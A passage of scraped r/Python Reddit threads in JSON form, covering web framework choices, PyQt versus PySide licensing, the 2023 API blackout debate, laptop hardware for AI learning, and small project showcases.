            "author": "[deleted]",
            "score": "87",
            "content": "I don't have Windows but one thing that always bothered me with Perl and Python on Windows was that you had to set your own %PATH% equivalent to get it working in cmd smoothly. Does the MSI do that for you these days?"
        },
        {
            "author": "DNSGeek",
            "score": "116",
            "content": "Oh hai Mark"
        },
        {
            "author": "HippoCreak",
            "score": "63",
            "content": "Personalized shoutouts like these really make a post wholesomely human"
        },
        {
            "author": "LeAstrale",
            "score": "28",
            "content": "I actually noticed this installing my first Python 3.7 release which is great, give credit where credit is due."
        },
        {
            "author": "toyg",
            "score": "4",
            "content": "Did nobody really notice this before...? It’s been there since 2.6 days if i remember correctly, possibly even earlier. Mark Hammond did an ungodly amount of work back then, between generic python and his excellent pywin32 bindings."
        },
        {
            "author": "vswr",
            "score": "3",
            "content": "PYTHON~1.EXE"
        },
        {
            "author": "Smallz1107",
            "score": "22",
            "content": "What’s DOS?"
        },
        {
            "author": "sban2009",
            "score": "4",
            "content": "Python uh... finds a way"
        },
        {
            "author": "aiasred",
            "score": "2",
            "content": "How does he find the time between this and NCIS?"
        }
    ]
},
{
    "post_author": "Eggesalt",
    "post_id": "1dgbq1e",
    "post_score": "107",
    "post_time": "Saturday, June 15, 2024 at 9:31:57 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Cant decide between flask, django ninja or fastAPI for sideproject",
    "media": [],
    "post_content": "As the title says, I cant decide what to use for rest api for mye summer project. I am uni student, so this project will only be very small scale project. I have made simpel rest apis in sll of them, but still cant decide which one to actuslly use for my project. Do anyone have any tips for which might be right one? A thing to consider for me answel is how easy it is to host.",
    "comments": [
        {
            "author": "mje-nz",
            "score": "74",
            "content": "If you've tried all of them and haven't found any reason why one would be better or worse for your project, just pick one. No-one here knows your needs better than you. They're all perfectly good frameworks for a small project, they're all similarly straightforward to host, and they're all widely used.",
            "replies": [
                {
                    "author": "dairypharmer",
                    "score": "13",
                    "content": "Exactly. OP, you may start down the road and find a reason to switch later, but premature optimization is one of the most common traps you can find yourself in. Just pick one and build your thing!"
                }
            ]
        },
        {
            "author": "sweet-tom",
            "score": "74",
            "content": "I had a similar issue for my projects. Django is the full-fledged framework and it's sometimes too much. But the support, documentation, and infrastructure is awesome. Maybe my insight is limited or flawed, but I have the impression Django needs more work to have a REST API. Maybe with Django Ninja it's easier. Flask and FastAPI are probably easier to use. Have you considered Litestar? Check it out, it might be the solution you are looking for. It's a completely async framework whereas Flask and Django are not. Not sure if it helps.",
            "replies": [
                {
                    "author": "Dantes111",
                    "score": "13",
                    "content": "FYI django-ninja basically clones FastAPI functionality into Django."
                }
            ]
        },
        {
            "author": "YesterdayDreamer",
            "score": "32",
            "content": "If you want to create a front-end and don't want to spend time learning JS, then use Django. If you don't want to create a front-end (or it is being created by someone else), then use FastAPI. If you have to implement login and authentication, Django is more beginner friendly for that. If login is not required, FastAPI is simpler to work with.",
            "replies": [
                {
                    "author": "SOKS33",
                    "score": "13",
                    "content": "I'm using FastAPI and NiceGUI as a frontend. No JS involved (unless I need a very specific thing), pure python, pure joy 😁 Also a project called Rio (I think?) seems to get a lot of traction."
                },
                {
                    "author": "Chance_of_Rain_",
                    "score": "6",
                    "content": "FastAPI and HTMX though"
                }
            ]
        },
        {
            "author": "OwnTension6771",
            "score": "8",
            "content": "FastAPI is the future. Get in now"
        },
        {
            "author": "LankyOccasion8447",
            "score": "27",
            "content": "FastAPI FTW"
        },
        {
            "author": "BismuthOS",
            "score": "11",
            "content": "Having worked with a lot of python at this point, FastAPI seems like the way to go. Better structure, better async support and things like Pydantic model support mean as your project grows you'll be able to keep a lot better handle on things. I'm using Flask + Restx in our project's SDK, but we're going to be swapping that over to FastAPI in a little bit for all the reasons I listed above."
        }
    ]
},
{
    "post_author": "INSERT_KEYWORD",
    "post_id": "1dip146",
    "post_score": "6",
    "post_time": "Tuesday, June 18, 2024 at 3:05:59 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Scrapegraph AI Tutorial; Scrape Websites Easily With LLaMA AI",
    "media": [
        "https://www.scrapingbee.com/blog/scrapegraph-ai-tutorial-scrape-websites-easily-with-llama-ai/"
    ],
    "post_content": "I'm going to show you how to get Scrapegraph AI up and running, how to set up a language model, how to process JSON, scrape websites, use different AI models, and even turning your data into audio. Sounds like a lot, but it's easier than you think, and I'll walk you through it step by step.\nhttps://www.scrapingbee.com/blog/scrapegraph-ai-tutorial-scrape-websites-easily-with-llama-ai/",
    "comments": [
        {
            "author": "Electronic_Spell_337",
            "score": "1",
            "content": "Cool, I will try this thanks. Do you have a youtube channel for this?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1delgo1",
    "post_score": "2",
    "post_time": "Thursday, June 13, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1dgv2s3",
    "post_score": "4",
    "post_time": "Sunday, June 16, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "hawkedmd",
            "score": "3",
            "content": "Coded Streamlit app, attempted to recode using Django this am - took way too long but have 50% features. Oddly took a bit less time with Vite/JS and was prettier. So… Streamlit is good enough. Every incremental change in the other two takes 5x or 3x as long."
        },
        {
            "author": "Jennedy",
            "score": "2",
            "content": "Im trying to break into a technical role right now, so doing a lot of projects in a few languages to put on my portfolio right now, but for python I just wrote a script that clears temp files, kills zombie processes, checks cpu and memory usage and purges if its over a set amount, and reboots my touch bar on my Mac (MacBook pro M1 users I'm sure you know this issue) - also scheduled this to run in the evenings using cron and have a documented logging file to go with it, pretty happy with it so far, but any other project ideas would be great !"
        },
        {
            "author": "ramiawar",
            "score": "2",
            "content": "I've been building https://dataline.app for the past year or so, looking for testers to get feedback now 😄 It's an open source and privacy-focused text to SQL + chart + more tool. Supports CSVs, SQLite and Postgres data sources, with more to come. Not sure which direction to take it in next, but I'm really happy with what we have so far. Please reach out if you try it out 🙂"
        },
        {
            "author": "marc-isdead",
            "score": "2",
            "content": "Building Pharmacy management system using Django, with user auth, medication database, payments, notifications about stock and etc.",
            "replies": [
                {
                    "author": "Immediate-Rate-3852",
                    "score": "2",
                    "content": "i'm doing the same but with pyside6"
                }
            ]
        },
        {
            "author": "chinapandaman",
            "score": "1",
            "content": "About to start putting together a developer guide doc for PyPDFForm since there are users requesting it."
        },
        {
            "author": "Ravensberg",
            "score": "1",
            "content": "Hi, I just finished a little tennis siumulation project and would be glad to get some feedback. I've been coding on and off for a few years, but never commited to finishing a project or going very far past demos. I'm quite pleased with the results and hope to continue making little games/simulation. https://github.com/Ravensberg/ATP-Simulation"
        },
        {
            "author": "baseballjustin5",
            "score": "1",
            "content": "I figured this was the best place, but there's a game on Steam called \"The Farmer Was Replaced, \" a Python-adjacent coding game (the save file uses .py files) to teach you Python by farming and unlocking different functions. It starts with just doing harvest() over and over manually, then eventually gives you if/for/while loops, dictionaries, and def functions. and so on, as you grow your plants. Very Cool. Great intro to Python/coding in general though https://store.steampowered.com/app/2060160/The_Farmer_Was_Replaced/"
        },
        {
            "author": "Sufficient_Roof_7414",
            "score": "1",
            "content": "If anyone would help I'm not sayin no as I want to to an Egyptian game call screw It's a card game multiplayer 4 players I also want it to be online I speak both Arabic and English I can teach you how to play and probably you will like it as 97%"
        }
    ]
},
{
    "post_author": "AccordingBeyond2985",
    "post_id": "1dcedjb",
    "post_score": "49",
    "post_time": "Monday, June 10, 2024 at 8:49:19 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Why would anyone use pyqt if pyside exists",
    "media": [],
    "post_content": "Like the only different is in pyqt you must share the code or buy a license and in pyside you can share it whether you want to or not. Yet i still see so many videos on pyqt and not pyside",
    "comments": [
        {
            "author": "riklaunim",
            "score": "97",
            "content": "Historically there was only PyQt so people used that, wrote books too and it stayed.",
            "replies": [
                {
                    "author": "GimmeSomeSugar",
                    "score": "28",
                    "content": "I just refer to this as inertia. For example, Adobe is terrible. All my homies hate Adobe. But Adobe products have too much inertia that switching away wouldn't generally be a PITA.",
                    "replies": [
                        {
                            "author": "AgentCosmic",
                            "score": "18",
                            "content": "Terrible compared to what? I use Adobe products begrudgingly, but their flagship products are still the best in the market.",
                            "replies": [
                                {
                                    "author": "Ambustion",
                                    "score": "9",
                                    "content": "Terrible at everything when you compare usage fees/subscriptions."
                                }
                            ]
                        },
                        {
                            "author": "PsyApe",
                            "score": "4",
                            "content": "You’re right, Flash was better when it was Macromedia 🤓"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Substantial-Bake-781",
            "score": "31",
            "content": "Mainly license from my perspective. PySide’s LGPL might not work for all projects. Riverbank offers a (relatively) cheap perpetual license which allows to do whatever, license wise. Of course, you’re usually still bound by Qt’s LGPL where commercial license is much more expensive, but if working for a big company you might have commercial license with them too.",
            "replies": [
                {
                    "author": "Kid-Boffo",
                    "score": "7",
                    "content": "Don't forget that a GPL is a \"Trojan license\". Depending where you use code licensed under it, you may be forced to release it. So if you're doing anything secret due to monetary advantage, a GPL is typically a non starter."
                }
            ]
        },
        {
            "author": "cediddi",
            "score": "23",
            "content": "Commercial support, faster updates, clear path to use in proprietary software."
        },
        {
            "author": "bjorneylol",
            "score": "8",
            "content": "Qt company stopped sponsoring PySide development after Nokia sold them off PySide didn't release for Qt5 until 2018 and didn't have full support (supplementary Qt modules like QMultiMedia, etc) until a while after that There was a ~6 year stretch where your only option was to either use PyQt, or use PySide and Qt4, which was basically falling apart at the seams on modern operating systems (it was no longer shipped for macOS so you had to compile the C++ source yourself, it didn't support UHD monitors properly, etc)"
        },
        {
            "author": "pyhannes",
            "score": "7",
            "content": "I'm just using QtPy as a wrapper and can change the backend so any time if requirements for licensing changes some day."
        },
        {
            "author": "catcint0s",
            "score": "5",
            "content": "We used it because there was no PySide, also pyqtdeploy is pretty handy."
        },
        {
            "author": "bizulk",
            "score": "2",
            "content": "Why do people use qt in python, don't you feel you have almost twice thé same thing ? The GUI part look thé thing that python does not propose an équivalent, but still there are alternatives. Also Qt IS becoming very agressive with companies involved with commercial development using Qt . They are not cheap at all."
        },
        {
            "author": "Atticus-zz",
            "score": "2",
            "content": "skip it to react or vue 😂"
        }
    ]
},
{
    "post_author": "IAmKindOfCreative",
    "post_id": "1434dxo",
    "post_score": "3615",
    "post_time": "Wednesday, June 7, 2023 at 8:29:21 AM GMT+3",
    "flair_text": "Meta",
    "post_title": "Should r/Python participate in the June 12th Blackout protesting the API changes",
    "media": [
        "https://www.reddit.com/r/redditisfun/comments/13wxepd/rif_dev_here_reddits_api_changes_will_likely_kill/",
        "https://www.reddit.com/r/RESAnnouncements/comments/141hyv3/announcement_res_reddits_upcoming_api_changes/",
        "https://www.reddit.com/r/redditdev/comments/13wsiks/api_update_enterprise_level_tier_for_large_scale/jmolrhn/?context=3",
        "https://www.reddit.com/r/Python/",
        "https://www.reddit.com/r/blind/",
        "https://www.python.org/psf/conduct/",
        "https://www.reddit.com/r/modnews/comments/141oqn8/api_updates_questions/",
        "https://www.reddit.com/user/iamkindofcreative/m/a_green_space/",
        "https://www.reddit.com/r/Save3rdPartyApps/comments/13yh0jf/dont_let_reddit_kill_3rd_party_apps/",
        "https://www.reuters.com/technology/reddit-lay-off-about-5-workforce-wsj-2023-06-06/",
        "https://www.reddit.com/r/RedditTalk/comments/11m4ijn/sunsetting_reddit_talk/",
        "https://www.reddit.com/r/apolloapp/comments/13ws4w3/had_a_call_with_reddit_to_discuss_pricing_bad/",
        "https://www.redditstatus.com/",
        "https://www.reddit.com/r/modnews/comments/134tjpe/reddit_data_api_update_changes_to_pushshift_access/",
        "https://www.reddit.com/r/reddit/comments/107orxe/ringing_in_2023_with_a_2022_reflection_on_mod/",
        "https://www.reddit.com/r/toolbox/comments/141locs/announcement_reddits_upcoming_api_changes_and/jn0klpy/?context=10000",
        "https://www.reddit.com/r/ModCoord/comments/1401qw5/incomplete_and_growing_list_of_participating/",
        "https://old.reddit.com/r/Python/comments/1424s7m/going_dark_on_12th_june/",
        "https://www.reddit.com/r/modnews/comments/13wshdp/api_update_continued_access_to_our_api_for/",
        "https://www.reddit.com/r/Blind/comments/13zr8h2/reddits_recently_announced_api_changes_and_the/",
        "https://www.reddit.com/r/ModCoord/comments/142jwv3/oh_really_spez/jn5f0of/"
    ],
    "post_content": "\"I didn't have time to write a short letter, so I wrote a long one instead.\"\nThis is a long one, so I'm putting the TLDR up top:\nTLDR\nA blackout has been proposed for June 12-14 to protest the API changes and extreme cost.\nThe r/Python community seems very vocal about joining the blackout and I would like the r/Python community's input on this. Would you like to participate? How would you like to participate?\nIf we do join the blackout, there are two different ways to participate which we need:\nSetting the subreddit to private (no engagement at all--including no ability to explain why our sub is private)\nTurning off submissions (the community and posts are still viewable, but no new comments or posts)\nPlease offer your feedback here, this isn't my decision alone to make.\nBackground to the issue:\nReddit has been making changes.\nAhead of their IPO, they're trying to get their ducks in a row, but in trying to maximize their value to potential shareholders, they're cutting off massive avenues of value to moderators and users.\nReddit, without warning, cut off Pushshift's API access (The stated reason is no response--but given their pricing structure for 3rd party mobile apps, and the time frame Reddit gave third party apps, any response by pushshift would have almost certainly resulted in this same action)\nReddit is making a move to remove API access to third party apps and developers. It's no stretch that this move is motivated because after a number of years they're unable to compete in the mobile app space. So instead of 'git-ing gud' they're just shutting down competition. Apollo App Response, Rif Response\nThey said RES will experience 'minimal' impact and old Reddit will be preserved. In the words of the Toolbox devs, \"[they are not impacted.] Yet (Toolbox is a great tool for moderation because moderating with Reddit's site tools alone is a pain), and similarly RES developers are not overly trusting. Similarly, the API once was safe\nReddit has laid off 5% of their staff\nThe above actions are presented with bias--because frankly I am biased and Reddit is presenting their reasoning with bias so please take both sides' explanations with a grain of salt. Or Crait's worth of salt. But I feel they are presented accurately enough for this post's purpose.\nWhy we care about these changes:\nAs a Moderator\nThere are a number of issues that a moderator has to deal with.\nFirst and foremost, I volunteer to do this. Moderation can be a drain on my energy, and is a time sink. Losing efficiencies reduce my ability to moderate, and Reddit Inc is laughably behind.\nReporting content as a moderator for admin review is an absolute pain, often a black box, there's at least three separate ways to report something instead of one consolidated form or three ways with parity across all three. The mechanisms have some overlap too. It's bad.\nOften the admin response is subpar. As a mod I get that, my responses are subpar as well, and often times purposefully subpar because you need to make a decision on some content and there's just only so much to go off of. But it's for the extreme cases that the subpar response becomes a problem, like when there's a clear botnet falsifying engagement, and I've highlighted 10 accounts in it, and highlighted the way to flag them, and only two of those get tagged as \"actioned for ban evasion\" and the other 8 are free to keep on posting. Identifying a botnet should be easy on the Reddit side, it's exhausting on mine. One of the ways to help flag this is groups like Pushshift, and loosing that means I either knowingly allow manipulation or I give up more volunteer time hunting manipulation down. (By the way the specific one I am being vague about was brought to my attention thanks to a user's report. If they didn't flag it I probably would have missed that botnet, small though it was, so I really appreciate those comments and reports).\nI cannot trust the admins. This isn't combative in nature, but it's because we have different goals. Often times they align, but sometimes our goals are at odds of each other. My goal is to try to make sure the communities I moderate are best able to thrive, and Reddit Inc's goals are to drive engagement and ad revenue. Usually, like when we get to do something fun like a great AMA, we get great community events and Reddit gets engagement and clicks. But long term, Reddit will always follow profit.\nSo these changes impact my workflow, and avenues to review and moderate content. And these are issues impacting our community. r/Python is a great sub and great community. Compared to a lot of other subreddit we have relatively few issues.\nCommunities which are identity, political, or news in nature have to deal with so much more. There's a ton to manage, there's a ton of filtering for mental health and safety that is needed too. Reddit is getting there when it comes to a lot of features, but their implementation is slow. It's getting measurably faster as they restructure, but they're still catching up to third party apps.\nAs a reddit user/Python developer\nAPIs are important. They're a wonderful gateway to programming, they help webpages serve information in a more lightweight fashion when webscraping would be costly (if you just need an upvote count, it's smarter to just make a call for than, then making a call for every asset a webpage renders. This gets a user what they need and isn't a burden on the site they're engaging with). APIs as a result both act as a great learning mechanism and as a way to keep from burdening the site as a whole.\nNo third party apps as alternatives makes it easier for Reddit to harvest data without pushback. And it makes it harder for users to customize their experience. This can be exceptionally important when it comes to communities which cater to important segments of the population, but segments which are so small that a profit focused organization would otherwise ignore.\nOne of the more notable communities that these changes strongly impact is r/blind, and there's an explanation of these changes and their impact here. It's very probable that these issues will be quickly addressed now that they're in the public eye. But the underlying reality is that third party apps had been able to cater to users and communities and the Reddit app, with Reddit's stewardship, has failed to address accessibility at this level.\nThe Blackout\nOn June 12th a blackout has been purposed.\nMany communities are praticipating, and as this post points out we're curious if we should join. The blackout is either to cover a two day span, or last until demands are appropriately addressed. (this distinction is on a community basis, and will probably depend on how reddit responds)\nThere are different ways to perform it, either set the sub to private or lock the sub so no submissions can go through. Setting the sub to private prevents all engagement in the sub, but also means that presenting a message to users about what is going on isn't possible.\nI think it makes sense to keep the sub up and visible but to freeze it so no new posts or comments go through, but I'd like to hear your thoughts.\nThe Admins Response to the blackout\nHere is their reply\nA rough TLDR (I'm omitting the NSFW changes because... They're not clear to me. Maybe that's my shortfall but I think they're very vague about those)\nReddit isn't changing their position at all. They're digging in their heels and 'clarifying' what they're doing. No decision is reversed.\nbots using api for mod tools will be safe--if they break \"[Reddit] will work with you to fix them. \"\nlaunching at future dates: mod features\nOn 2)--they basically told Apollo app to, \"Figure it out themselves\" https://www.reddit.com/r/redditdev/comments/13wsiks/api_update_enterprise_level_tier_for_large_scale/jmolrhn/?context=3 so forgive me if I don't find goodwill in that message.\nOn 3) So many of those updates exist already in third party apps. So many of them are only getting attention this long into the Reddit app's lifespan because mods are making a stink about not moderating through the Reddit app. So especially for the rollout date of Sept. portions--I don't really believe it'll be executed well. And I don't want the mobile app on my phone. It's big, slow, and harvests a lot of data.\nAnd when that post went live Reddit was breaking again.\nhttps://www.redditstatus.com/\nNot really something that exudes confidence in their ability to make good product decisions.\nNow being fair here, there absolutely has been a focus on improving modtools over this past year, but they're still wildly behind. It's.. uncomfortable to trust a site when they cut off the alternatives for profit. Once there's no competition there's no longer a reason to loose revenue on further developing these resources.\nWe were a part of the Reddit Talk platform development, and the admins we got to work with were lovely, and worked hard to greenlight the features moderators requested. A lot of those features were fleshing out the API so we could handle a Reddit Talk session in our workflows.\nBut after a while they shutdown Reddit Talk and that makes it difficult to trust long term product commitments from Reddit. Even if we get great admins who listen to feedback rolling out a product--they're not ultimately the ones who make the calls for the future.\nThe admin response to the threat of a blackout reaffirms their changes and makes a lot of future promises for moderation tools. They sound good but at best those features should have been here ages ago, and their presentation betrays a lack of focus or care for moderation tools until recently. That recent change is affirming to see, but looking at Reddit's track record it might just be a passing phase until the public eye is off of the company.\nWhat does this mean to r/Python\nThat is mostly my question to you.\nThere are some defined things:\nIf we blackout, the sub turns off. No one can post or comment for a while, and we hope our added voice helps encourage Reddit to continue to allow third party apps.\nIf we don't join the blackout, we can still hope but there's less weight behind it.\nWe don't normally join in on Reddit's protests. So this would be a new thing for our community--is this cause worth the loss in a few days of posts?\nThere is a post by another user asking this question and at present it is the second most upvoted submission in the past year. So there has been a lot of great talk already, but I need to ask this question here as well to be sure I'm listening to the community as a whole.\nShould r/Python join the June 12th Blackout?\nIf we do, should we completely go private, or should we prevent the commenting or posting in our community during that period so an explanation of what is going on is viewable?\nPlease give your feedback, I'm reading through both this and the original submission to keep an eye on things. Remember though, be respectful. We're a Python focused community, so in addition to the rules here in the sub, I hope you'll adhere to the PSF Code of Conduct. Be respectful to one another. Disagree with opinions, but be respectful of people.\nAnd now for something completely different",
    "comments": [
        {
            "author": "spuds_in_town",
            "score": "1620",
            "content": "100% In fact, why leave it at 2 days, do as many others are doing and go dark until they change their minds.",
            "replies": [
                {
                    "author": "IrrerPolterer",
                    "score": "419",
                    "content": "This. Absolutely don't limit the protest to 2 days. On the 'how' question - I prefer leaving existing content visible and only blocking new posts and comments. This will keep this subreddits goal for education intact, while still removing traffic from reddit significantly.",
                    "replies": [
                        {
                            "author": "buqr",
                            "score": "198",
                            "content": "I hate beer.",
                            "replies": [
                                {
                                    "author": "Vermathorax",
                                    "score": "63",
                                    "content": "This sounds like a good way to immediately show Reddit an “impact” and then restore the intent and goal of the subreddit while still impacting Reddit."
                                }
                            ]
                        },
                        {
                            "author": "draeath",
                            "score": "3",
                            "content": "If education is the concern, well... isn't that more the job of r/learnpython than ours here?",
                            "replies": [
                                {
                                    "author": "Doppelbockk",
                                    "score": "1",
                                    "content": "Every sub needs to participate though."
                                }
                            ]
                        },
                        {
                            "author": "Different-Music2616",
                            "score": "1",
                            "content": "That is so smart!"
                        },
                        {
                            "author": "asphias",
                            "score": "1",
                            "content": "i suggest read-only with a sticky on why it is now read-only."
                        }
                    ]
                }
            ]
        },
        {
            "author": "darthchebreg",
            "score": "337",
            "content": "Yes, we all are concerned. Let’s go dark !"
        },
        {
            "author": "Logicalist",
            "score": "260",
            "content": "Personally, I worried that I might come to reddit forgetting what day it is, and would greatly appreciate it if this sub was dark. So if I do come, I can be like oh yeah, I'm not supposed to be on reddit for these two days."
        },
        {
            "author": "[deleted]",
            "score": "501",
            "content": "We're a coding community. There's no reason we shouldn't be joining this. Go absolutely private for the 2 days."
        },
        {
            "author": "djagoo",
            "score": "169",
            "content": "Yes, go private."
        },
        {
            "author": "Ginomania",
            "score": "116",
            "content": "Go private and yes, please join and participate"
        },
        {
            "author": "DrTautology",
            "score": "93",
            "content": "Yes"
        },
        {
            "author": "Saphyel",
            "score": "70",
            "content": "Let's go private!"
        }
    ]
},
{
    "post_author": "ANil1729",
    "post_id": "1de8hji",
    "post_score": "5",
    "post_time": "Wednesday, June 12, 2024 at 5:48:30 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Open-source AI shorts generator in python",
    "media": [
        "https://github.com/SamurAIGPT/Text-To-Video-AI"
    ],
    "post_content": "I have open-sourced a Text-To-Video-AI generated which generates video from a topic by collecting relevant stock videos and stitching them together similar to popular video tools like Invideo, Pictory etc.\nLink to code :- https://github.com/SamurAIGPT/Text-To-Video-AI",
    "comments": [
        {
            "author": "pandi85",
            "score": "7",
            "content": "You are the McDonald's in the internets enshitification drive through, thanks for making the world a better place"
        },
        {
            "author": "Electronic_Spell_337",
            "score": "1",
            "content": "Thanks, will check this out.",
            "replies": [
                {
                    "author": "ANil1729",
                    "score": "1",
                    "content": "Glad you found it useful"
                }
            ]
        }
    ]
},
{
    "post_author": "Madlynik",
    "post_id": "1djfqwx",
    "post_score": "0",
    "post_time": "Wednesday, June 19, 2024 at 1:20:46 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "What are the hardware requirements in a laptop to run Python + Future AI based projects?",
    "media": [],
    "post_content": "I will buy a laptop for coding purposes but just started learning and practising Python using Pyecharm. What are the software requirements that lead to hardware specs a general Python coder must look into?\nPlease suggest the hardware setup within a pocket friendly budget.",
    "comments": [
        {
            "author": "VectorTwoFiveZero",
            "score": "28",
            "content": "Honestly, almost any laptop will let you run Python and Pycharm. Ideally get at least 16Gb of RAM, and 32GB if possible. Any modern CPU will do. For advanced data science or AI, you'll want an NVIDIA dedicated GPU with at least 12GB 8GB of vram as a bare minimum. But if you actually want to do real hardcore DS and AI development, you won't be doing it on a laptop, you'll be doing it on hefty cloud resources. But the laptop GPU I mentioned above would be fine for learning projects. Edit: As was pointed out in comments, 8GB is probably plenty for a laptop GPU for most things.",
            "replies": [
                {
                    "author": "ovoid709",
                    "score": "7",
                    "content": "I agree with this comment, but OP could save a few bucks with an 8GB GPU. I work pretty heavily with AI assisted photogrammetry and my 4070 does a decent job. Once you go up to a 4080/4090 most laptops cannot cool them well enough for them to perform much better than a 4070. In a desktop I would absolutely go up to the 80/90 level though."
                }
            ]
        },
        {
            "author": "PeaDelicious",
            "score": "6",
            "content": "Just start.. as you level up, you can go off CPU or find a way to write efficient code"
        },
        {
            "author": "LoathsomeNeanderthal",
            "score": "4",
            "content": "I got my degree using an old laptop with an i3 and no dedicated graphics card. I did resort to using Google Collab for some of the heavy lifting though."
        },
        {
            "author": "jtnishi",
            "score": "4",
            "content": "Don’t worry about Python. It will run fine on just about anything you’d consider fine for the AI dev side. Focus on that requirement instead."
        },
        {
            "author": "Schwarzfisch13",
            "score": "2",
            "content": "Depends on which kind of workloads you want to run and whether you want to run workloads locally or in cloud and need to run them on the go. I like to run some workloads locally and for budget reasons like to buy refurbished workstation/business notebooks (Lenovo Thinkpad, Dell Precision, ..., another option are gaming laptops). I usually want XEON or I7 CPUs, >16GB RAM and Thunderbolt for adding an eGPU if necessary. Since I want to run light \"AI\"-workloads on the go, I also look for a dedicated GPU with at least 6GB of VRAM (Quadro P3200, GTX 1060 6GB). This is enough to run a quantized LLM alongside a smaller STT and TTS model or basic image generation. Each GB of VRAM will make a difference, but only if you really need to run workloads locally and on the go. If you don't need to run workloads on the go, you can use a much cheaper laptop just for development and run the workloads via cloud services (Google Colab, Runpod, LambdaLabs, ...) or run them on a solid PC if you prefer local, which you can upgrade for much longer and cheaper. I had some bad experiences with consumer grade notebooks, especially newer ones, so I would still focus on refurbished workstation/business notebooks, just without a dedicated GPU. Currently, I am happy with using a refurbished Dell Precision 7530, XEON E-2176M, 64GB RAM, Quadro P3200 and optionally an RTX 3060 as eGPU. However, a PC from refurbished/second-hand parts with a few Tesla P40/P100 GPUs would get you much more capability and performance for not that much more budget and maybe could be extended with RTX A5000/A6000 GPUs in a few years."
        },
        {
            "author": "spinwizard69",
            "score": "2",
            "content": "This isn't as easy to answer as some suggest here. The number one problem is that you are just learning python so getting deep into AI could be a year off (more or less). You can learn PYthon on anything including a Raspberry PI. This means for this end of the task any laptop will do. Now when you start to talk about AI it really depends upon what you intend to do AI wise. However going off the rails supported by most posts I'm going to suggest getting one of Apples laptops with Neural Engine. Either that or wait for AMD's chip set that will be out soon with its own AI acceleration engine. This way you will have dedicated AI acceleration hardware which may or may not be important depending upon what you intend to do. For a desktop that would be Ryzen 8000G Phoenix and Ryzen 8040 AI APU's for mobile (coming). The third alternative is to take a gamble on Snapdragon X. What I'm saying is that long term AI/ML acceleration hardware is the future. Unfortunately at this moment in time the hardware is really new outside of Apple. It might even be worthwhile to get a cheap laptop for Python now and in a year or two upgrade as the market shakes out. Microsoft is all in with respect to the so called Neural acceleration hardware so again it makes sense to have such hardware as the support matures."
        },
        {
            "author": "ryukinix",
            "score": "2",
            "content": "Maybe a controversial opinion, but... Can be even a potato computer if you have the right skills. I used between 2066-2019± a Dell latitude d620 (2005, 32 bits hardware) notebook for data science, and before a LGA775 2010 computer. Today... I use slightly better computers, but I think it's not the main point here. A modern Lenovo Thinkpad with i5/i7 and 16gb RAM, optionally with any extra GPU, it's more than enough. Most of the heavy stuff today you use cloud infrastructure anyway. Honestly, for frontend and mobile development we need much more high end computers than data science. PS.: I work with data science and ml engineering for basically ten years."
        },
        {
            "author": "Hesirutu",
            "score": "1",
            "content": "You can code and run Python on anything that runs Windows 10 or higher. For deep learning even the best laptop will be barely acceptable. Get a good desktop gpu or pay for expensive cloud resources."
        },
        {
            "author": "semper-noctem",
            "score": "1",
            "content": "Shoot, it'll run on damn near anything."
        }
    ]
},
{
    "post_author": "inobody_somebody",
    "post_id": "1dh3jtj",
    "post_score": "0",
    "post_time": "Sunday, June 16, 2024 at 12:01:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Built a RAG ( Retrieval-Augmented Generation ) model using Gemini Api.",
    "media": [
        "https://github.com/dharmateja2810/RAG-Retrieval-Augmented-Generation-Model"
    ],
    "post_content": "what my project does\nThis project is built to solve the issue of LLM unable to produce relevant answers for information in a particular context. uses the information to train the model and stored it in a database and uses this database to get relevant answers from the Model.\nTarget audiance\nThis project is for people who want to train a LLM on a particular piece of information.\ncomparison\nThis model only gives answers for information regarding the data you provided in the file. It will not answer any other questions including formal greetings.\nGitHub link :https://github.com/dharmateja2810/RAG-Retrieval-Augmented-Generation-Model",
    "comments": [
        {
            "author": "forebareWednesday",
            "score": "1",
            "content": "I appreciate this very much, thank you for sharing!"
        },
        {
            "author": "OkLavishness5505",
            "score": "-23",
            "content": "",
            "replies": [
                {
                    "author": "TheDraykkon",
                    "score": "12",
                    "content": "Either be constructive or stfu. If they’re beginning with AI this is good practice for them. If you don’t want to engage then don’t."
                }
            ]
        }
    ]
},
{
    "post_author": "Mayank008",
    "post_id": "hnknw0",
    "post_score": "3329",
    "post_time": "Wednesday, July 8, 2020 at 7:53:43 PM GMT+3",
    "flair_text": "Image Processing",
    "post_title": "A Program that acts as an \"invisibility cloak\"... It camouflages any person/object that appears in front of the camera.... Sorry for the colour jittering🙈",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "thelastsamurai07",
            "score": "175",
            "content": "https://www.reddit.com/r/interestingasfuck/comments/hnhgfx/this_girl_made_an_invisible_cloak_using_python/?utm_medium=android_app&utm_source=share What are the odds that I see two people doing the exact same project on the same day! Nonetheless, good job OP!",
            "replies": [
                {
                    "author": "Mayank008",
                    "score": "78",
                    "content": "Oh, it's a little common project",
                    "replies": [
                        {
                            "author": "Mayank008",
                            "score": "53",
                            "content": "Ya, i saw this on LinkedIn.. This video only inspired me to build my own invisibility cloak program"
                        },
                        {
                            "author": "[deleted]",
                            "score": "10",
                            "content": "I've seen that other project on LinkedIn and I thought someone would be posting it soon on reddit and here you are. Great work man."
                        }
                    ]
                }
            ]
        },
        {
            "author": "ValhallaPaperBoy",
            "score": "358",
            "content": ""
        },
        {
            "author": "Lost4ver",
            "score": "30",
            "content": "Just saw a similar project in LinkedIn as well it's quite interesting"
        },
        {
            "author": "Mayank008",
            "score": "21",
